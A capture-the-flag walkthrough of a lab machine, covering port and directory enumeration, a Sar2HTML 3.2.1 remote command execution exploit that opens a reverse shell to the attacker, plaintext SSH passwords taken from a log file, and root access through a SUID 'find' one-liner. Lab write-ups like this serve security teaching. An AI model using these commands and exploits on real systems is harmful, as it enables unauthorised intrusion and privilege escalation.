Difficult: Medium
-------------------------------
Note: Intermediate level CTF. Just enumerate, you'll get there.
-------------------------------
 +Scan ports and enumerate the directories:

 ```bash
	sudo nmap -sV -vv -A -T4 -p- <IP> -oN ports.txt
		PORT      STATE SERVICE REASON         VERSION
		21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
		|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
		| ftp-syst: 
		|   STAT: 
		| FTP server status:
		|      Connected to ::ffff:10.11.101.46
		|      Logged in as ftp
		|      TYPE: ASCII
		|      No session bandwidth limit
		|      Session timeout in seconds is 300
		|      Control connection is plain text
		|      Data connections will be plain text
		|      At session startup, client count was 3
		|      vsFTPd 3.0.3 - secure, fast, stable
		|_End of status
		80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
		|_http-server-header: Apache/2.4.18 (Ubuntu)
		| http-robots.txt: 1 disallowed entry 
		|_/
		| http-methods: 
		|_  Supported Methods: GET HEAD POST OPTIONS
		|_http-title: Apache2 Ubuntu Default Page: It works
		10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
		|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
		| http-methods: 
		|_  Supported Methods: GET HEAD POST OPTIONS
		|_http-favicon: Unknown favicon MD5: D912D07B2CBF691D5BE9133599FAD01F
		55007/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey: 
		|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
		| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
		|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
		| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
		|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
		|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
 ```
 
 +Enumerate the directories of <IP>:
 
 ```bash
	gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -xtxt,html,php -t64
		===============================================================
		Gobuster v3.6
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
		===============================================================
		[+] Url:                     http://10.10.91.237
		[+] Method:                  GET
		[+] Threads:                 64
		[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
		[+] Negative Status codes:   404
		[+] User Agent:              gobuster/3.6
		[+] Extensions:              txt,html,php
		[+] Timeout:                 10s
		===============================================================
		Starting gobuster in directory enumeration mode
		===============================================================
		/index.html           (Status: 200) [Size: 11321]
		/.html                (Status: 403) [Size: 292]
		/.php                 (Status: 403) [Size: 291]
		/manual               (Status: 301) [Size: 313] [--> http://10.10.91.237/manual/]
		/robots.txt           (Status: 200) [Size: 257]
		/joomla               (Status: 301) [Size: 313] [--> http://10.10.91.237/joomla/]

 ```

+Try login Anonymous account of FTP:

```bash
	ftp <IP> 
		Name: Anonymous
		230 Login successful.
		_ftp> more .info.txt
		Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl! 
		  -> Decode ROT13 format: "Just wanted to see if you find it. Lol. Remember: Enumeration is the key!"
```

+Enumerate the directories of /joomla:

```bash
$ gobuster dir -u http://<IP>/joomla/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x.txt,.php -t64
		Starting gobuster in directory enumeration mode
		===============================================================
		/images               (Status: 301) [Size: 320] [--> http://10.10.36.100/joomla/images/]
		/index.php            (Status: 200) [Size: 12478]
		/media                (Status: 301) [Size: 319] [--> http://10.10.36.100/joomla/media/]
		/templates            (Status: 301) [Size: 323] [--> http://10.10.36.100/joomla/templates/]
		/.php                 (Status: 403) [Size: 298]
		/modules              (Status: 301) [Size: 321] [--> http://10.10.36.100/joomla/modules/]
		/tests                (Status: 301) [Size: 319] [--> http://10.10.36.100/joomla/tests/]
		/bin                  (Status: 301) [Size: 317] [--> http://10.10.36.100/joomla/bin/]
		/plugins              (Status: 301) [Size: 321] [--> http://10.10.36.100/joomla/plugins/]
		/includes             (Status: 301) [Size: 322] [--> http://10.10.36.100/joomla/includes/]
		/language             (Status: 301) [Size: 322] [--> http://10.10.36.100/joomla/language/]
		/README.txt           (Status: 200) [Size: 4793]
		/components           (Status: 301) [Size: 324] [--> http://10.10.36.100/joomla/components/]
		/cache                (Status: 301) [Size: 319] [--> http://10.10.36.100/joomla/cache/]
		/libraries            (Status: 301) [Size: 323] [--> http://10.10.36.100/joomla/libraries/]
		/installation         (Status: 301) [Size: 326] [--> http://10.10.36.100/joomla/installation/]
		/build                (Status: 301) [Size: 319] [--> http://10.10.36.100/joomla/build/]
		/tmp                  (Status: 301) [Size: 317] [--> http://10.10.36.100/joomla/tmp/]
		/LICENSE.txt          (Status: 200) [Size: 18092]
		/layouts              (Status: 301) [Size: 321] [--> http://10.10.36.100/joomla/layouts/]
		/administrator        (Status: 301) [Size: 327] [--> http://10.10.36.100/joomla/administrator/]
		/configuration.php    (Status: 200) [Size: 0]
		/htaccess.txt         (Status: 200) [Size: 3159]
		/cli                  (Status: 301) [Size: 317] [--> http://10.10.36.100/joomla/cli/]
		/_files               (Status: 301) [Size: 320] [--> http://10.10.36.100/joomla/_files/]
```
 + After try to list and read directories / in turn, we do not find any interesting file so we enumerate directories again with other wordlists.
 + We choose the wordlists which used to find the hidden directories /dirb/common.txt

```bash
  $ gobuster dir -u http://<IP>/joomla/ -w /usr/share/wordlists/dirb/common.txt -x.txt,.php -t64
		===============================================================
		Starting gobuster in directory enumeration mode
		===============================================================
		/.hta.txt             (Status: 403) [Size: 302]
		/.hta.php             (Status: 403) [Size: 302]
		/_archive             (Status: 301) [Size: 322] [--> http://10.10.36.100/joomla/_archive/]
		/_database            (Status: 301) [Size: 323] [--> http://10.10.36.100/joomla/_database/]
		/_files               (Status: 301) [Size: 320] [--> http://10.10.36.100/joomla/_files/]
		/.htaccess            (Status: 403) [Size: 303]
		/_test                (Status: 301) [Size: 319] [--> http://10.10.36.100/joomla/_test/]
		/.htaccess.txt        (Status: 403) [Size: 307]
		/.htaccess.php        (Status: 403) [Size: 307]
		/.htpasswd            (Status: 403) [Size: 303]
		/.htpasswd.txt        (Status: 403) [Size: 307]
		/.htpasswd.php        (Status: 403) [Size: 307]
		/~www                 (Status: 301) [Size: 318] [--> http://10.10.36.100/joomla/~www/]
		/.php                 (Status: 403) [Size: 298]
		/.hta                 (Status: 403) [Size: 298]
		/administrator        (Status: 301) [Size: 327] [--> http://10.10.36.100/joomla/administrator/]
		/bin                  (Status: 301) [Size: 317] [--> http://10.10.36.100/joomla/bin/]
		/build                (Status: 301) [Size: 319] [--> http://10.10.36.100/joomla/build/]
		/cache                (Status: 301) [Size: 319] [--> http://10.10.36.100/joomla/cache/]
		/components           (Status: 301) [Size: 324] [--> http://10.10.36.100/joomla/components/]
		/configuration.php    (Status: 200) [Size: 0]
		/images               (Status: 301) [Size: 320] [--> http://10.10.36.100/joomla/images/]
		/includes             (Status: 301) [Size: 322] [--> http://10.10.36.100/joomla/includes/]
		/index.php            (Status: 200) [Size: 12478]
		/index.php            (Status: 200) [Size: 12478]
		/installation         (Status: 301) [Size: 326] [--> http://10.10.36.100/joomla/installation/]
		/language             (Status: 301) [Size: 322] [--> http://10.10.36.100/joomla/language/]
		/layouts              (Status: 301) [Size: 321] [--> http://10.10.36.100/joomla/layouts/]
		/libraries            (Status: 301) [Size: 323] [--> http://10.10.36.100/joomla/libraries/]
		/LICENSE.txt          (Status: 200) [Size: 18092]
		/media                (Status: 301) [Size: 319] [--> http://10.10.36.100/joomla/media/]
		/modules              (Status: 301) [Size: 321] [--> http://10.10.36.100/joomla/modules/]
		/plugins              (Status: 301) [Size: 321] [--> http://10.10.36.100/joomla/plugins/]
		/README.txt           (Status: 200) [Size: 4793]
		/templates            (Status: 301) [Size: 323] [--> http://10.10.36.100/joomla/templates/]
		/tests                (Status: 301) [Size: 319] [--> http://10.10.36.100/joomla/tests/]
		/tmp                  (Status: 301) [Size: 317] [--> http://10.10.36.100/joomla/tmp/]
		/web.config.txt       (Status: 200) [Size: 1859]
		Progress: 13842 / 13845 (99.98%)
		===============================================================
		Finished
		===============================================================
```
+ Check and list again directories in turn, we find the / that we can exploit -> /_test.
+ /_test this is the sar2html. Research it and find we can exploit the vulnerability.
+ That is the vulnerable to remote command execution in Sar2HTML 3.2.1
+ Link exploit: "https://github.com/Jsmoreira02/sar2HTML_exploit"

```bash
  $ python3 sar2html_exploit.py http://10.10.36.100/joomla/_test/index.php --shell_mode
	 _____            _____  _   _ ________  ___ _          _____           _       _ _   
	/  ___|          / __  \| | | |_   _|  \/  || |        |  ___|         | |     (_) |  
	\ `--.  __ _ _ __`' / /'| |_| | | | | .  . || |  ______| |____  ___ __ | | ___  _| |_ 
	 `--. \/ _` | '__| / /  |  _  | | | | |\/| || | |______|  __\ \/ / '_ \| |/ _ \| | __|
	/\__/ / (_| | |  ./ /___| | | | | | | |  | || |____    | |___>  <| |_) | | (_) | | |_ 
	\____/ \__,_|_|  \_____/\_| |_/ \_/ \_|  |_/\_____/    \____/_/\_\ .__/|_|\___/|_|\__|
	                                                                 | |                  
	                                                                 |_|                  

	[+] URL found! Starting shell upload...
	------------------------------
	LHOST= <IP_ATTK>
	LPORT= 1234
	------------------------------

	[+] Creating process...

	---> Server started http://127.0.0.1:8000
	---> Listening on port 1234

	[!] SHELL upload is possible in the target!

	Spawning your shell :)

	bash: cannot set terminal process group (1139): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@Vulnerable:/var/www/html/joomla/_test$ ls
	ls
	index.php
	log.txt
	sar2html
	sarFILE
	shell.php
	www-data@Vulnerable:/var/www/html/joomla/_test$ id
	id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
+ The interesting file name: log.txt

```bash
www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt
cat log.txt
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```
-> Username: basterd & Password: superduperp@$$ (SSH)
+ Login SSH with port 55007 with the user "basterd".
+ Read file backup.sh -> we get the other user: "Username:stoner and Password:superduperp@$$no1knows"
+ Login with user "stoner".

#Privelege Escalation
 + Use the user "stoner" to priv escalation.
 + Find file with SUID:

 ```bash
	$ find / -uid 0 -perm -4000 -type f 2>/dev/null
	  /usr/bin/find
 ```
 + We can use 'find' to priv with SUID:
 
 ```bash
	stoner@Vulnerable:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
	# whoami
	root
 ```

END!!!